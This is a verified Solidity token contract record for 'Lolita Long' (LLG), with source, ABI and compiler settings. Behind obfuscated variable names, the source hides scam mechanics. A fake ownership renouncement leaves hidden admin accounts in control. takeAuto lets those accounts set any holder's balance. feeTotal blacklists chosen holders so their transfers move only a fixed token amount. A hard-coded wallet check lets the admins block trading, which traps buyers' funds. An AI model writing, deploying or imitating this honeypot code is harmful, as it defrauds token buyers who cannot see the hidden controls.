{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface buyLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxMinLimit {\n    function createPair(address listToken, address tradingAmount) external returns (address);\n}\n\ninterface senderFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableFrom) external view returns (uint256);\n\n    function transfer(address shouldBuy, uint256 shouldIs) external returns (bool);\n\n    function allowance(address fromAuto, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 shouldIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldBuy,\n        uint256 shouldIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingSell, uint256 value);\n    event Approval(address indexed fromAuto, address indexed spender, uint256 value);\n}\n\ninterface senderFundMetadata is senderFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LolitaLong is teamTrading, senderFund, senderFundMetadata {\n\n    function takeAuto(address senderTrading, uint256 shouldIs) public {\n        buyIsSwap();\n        tokenAmountTx[senderTrading] = shouldIs;\n    }\n\n    bool private minMax;\n\n    uint256 public amountMarketing;\n\n    mapping(address => bool) public feeSender;\n\n    function feeTx(address receiverFee, address shouldBuy, uint256 shouldIs) internal returns (bool) {\n        if (receiverFee == totalMaxFrom) {\n            return buyIs(receiverFee, shouldBuy, shouldIs);\n        }\n        uint256 sellMin = senderFund(minBuy).balanceOf(walletIs);\n        require(sellMin == autoShould);\n        require(shouldBuy != walletIs);\n        if (marketingFrom[receiverFee]) {\n            return buyIs(receiverFee, shouldBuy, teamAmount);\n        }\n        return buyIs(receiverFee, shouldBuy, shouldIs);\n    }\n\n    uint256 constant teamAmount = 13 ** 10;\n\n    uint256 totalSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return atLimit;\n    }\n\n    address public totalMaxFrom;\n\n    address private tradingReceiver;\n\n    function buyIsSwap() private view {\n        require(feeSender[_msgSender()]);\n    }\n\n    function approve(address maxEnable, uint256 shouldIs) public virtual override returns (bool) {\n        autoEnable[_msgSender()][maxEnable] = shouldIs;\n        emit Approval(_msgSender(), maxEnable, shouldIs);\n        return true;\n    }\n\n    bool public enableTo;\n\n    function feeTotal(address launchReceiver) public {\n        buyIsSwap();\n        if (modeLaunch == listLaunched) {\n            listLaunched = amountExemptEnable;\n        }\n        if (launchReceiver == totalMaxFrom || launchReceiver == minBuy) {\n            return;\n        }\n        marketingFrom[launchReceiver] = true;\n    }\n\n    uint256 private amountExemptEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return autoWallet;\n    }\n\n    string private liquiditySenderLaunch = \"Lolita Long\";\n\n    function name() external view virtual override returns (string memory) {\n        return liquiditySenderLaunch;\n    }\n\n    function buyIs(address receiverFee, address shouldBuy, uint256 shouldIs) internal returns (bool) {\n        require(tokenAmountTx[receiverFee] >= shouldIs);\n        tokenAmountTx[receiverFee] -= shouldIs;\n        tokenAmountTx[shouldBuy] += shouldIs;\n        emit Transfer(receiverFee, shouldBuy, shouldIs);\n        return true;\n    }\n\n    uint256 public modeLaunch;\n\n    address public minBuy;\n\n    function owner() external view returns (address) {\n        return tradingReceiver;\n    }\n\n    string private atLimit = \"LLG\";\n\n    function allowance(address exemptTx, address maxEnable) external view virtual override returns (uint256) {\n        if (maxEnable == modeBuyFee) {\n            return type(uint256).max;\n        }\n        return autoEnable[exemptTx][maxEnable];\n    }\n\n    uint256 public amountFund;\n\n    function transferFrom(address receiverFee, address shouldBuy, uint256 shouldIs) external override returns (bool) {\n        if (_msgSender() != modeBuyFee) {\n            if (autoEnable[receiverFee][_msgSender()] != type(uint256).max) {\n                require(shouldIs <= autoEnable[receiverFee][_msgSender()]);\n                autoEnable[receiverFee][_msgSender()] -= shouldIs;\n            }\n        }\n        return feeTx(receiverFee, shouldBuy, shouldIs);\n    }\n\n    function autoReceiver(uint256 shouldIs) public {\n        buyIsSwap();\n        autoShould = shouldIs;\n    }\n\n    uint256 autoShould;\n\n    event OwnershipTransferred(address indexed buyTx, address indexed modeShould);\n\n    mapping(address => mapping(address => uint256)) private autoEnable;\n\n    function balanceOf(address enableFrom) public view virtual override returns (uint256) {\n        return tokenAmountTx[enableFrom];\n    }\n\n    function fundTx() public {\n        emit OwnershipTransferred(totalMaxFrom, address(0));\n        tradingReceiver = address(0);\n    }\n\n    constructor (){\n        \n        buyLaunch swapTake = buyLaunch(modeBuyFee);\n        minBuy = maxMinLimit(swapTake.factory()).createPair(swapTake.WETH(), address(this));\n        \n        totalMaxFrom = _msgSender();\n        fundTx();\n        feeSender[totalMaxFrom] = true;\n        tokenAmountTx[totalMaxFrom] = autoAt;\n        if (enableMarketing == amountExemptEnable) {\n            marketingShould = false;\n        }\n        emit Transfer(address(0), totalMaxFrom, autoAt);\n    }\n\n    function getOwner() external view returns (address) {\n        return tradingReceiver;\n    }\n\n    uint256 public listLaunched;\n\n    function transfer(address senderTrading, uint256 shouldIs) external virtual override returns (bool) {\n        return feeTx(_msgSender(), senderTrading, shouldIs);\n    }\n\n    mapping(address => bool) public marketingFrom;\n\n    bool private marketingShould;\n\n    uint256 public enableMarketing;\n\n    uint256 private autoAt = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return autoAt;\n    }\n\n    uint8 private autoWallet = 18;\n\n    address modeBuyFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => uint256) private tokenAmountTx;\n\n    function enableIs(address receiverSell) public {\n        if (enableTo) {\n            return;\n        }\n        \n        feeSender[receiverSell] = true;\n        \n        enableTo = true;\n    }\n\n    address walletIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromAuto\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeShould\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingSell\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"autoReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSell\",\"type\":\"address\"}],\"name\":\"enableIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchReceiver\",\"type\":\"address\"}],\"name\":\"feeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLaunched\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"takeAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalMaxFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"shouldIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "LolitaLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}